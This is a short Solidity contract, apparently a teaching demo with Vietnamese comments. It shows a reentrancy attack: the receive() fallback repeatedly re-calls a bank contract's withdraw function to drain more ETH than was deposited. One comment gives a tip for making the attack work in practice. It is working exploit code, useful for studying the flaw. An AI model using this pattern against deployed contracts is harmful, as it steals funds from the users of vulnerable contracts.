// SPDX-License-Identifier: MIT
/**
 * @notice Mô phỏng lại quá trình rút tiền từ ngân hàng smartcontract blockchain
 * Sử dụng native ETH để exploit reentrancy attack
 */
pragma solidity <0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./IBank.sol";

contract Exploit is Ownable {
    IBank public bank;
    uint256 private attackCount = 0;
    uint256 private maxAttacks = 5;

    constructor(address bankAddress) public {
        bank = IBank(bankAddress);
    }

    function depositToBank() external payable {
        bank.deposit.value(msg.value)(); // Nạp ETH vào bank
    }

    function withdrawFromBank(uint256 amount) external {
        bank.withdraw(amount);
    }

    receive() external payable {
        /**
         * Trong thực tế phải check thêm contract bank còn dư số native token để tránh bị lỗi gây ra rút tiền không được vì lỗi CEI pattern
         * msg.sender == address(bank) : mục đích để hacker nạp tiền vào để contract này đóng vai trò là 1 wallet người dùng vẫn nạp và rút bank, nếu không có dòng này nạp sẽ bị lỗi
         */
        if (msg.sender == address(bank) && attackCount < maxAttacks) {
            attackCount++;
            bank.withdraw(msg.value);
        }
    }
}
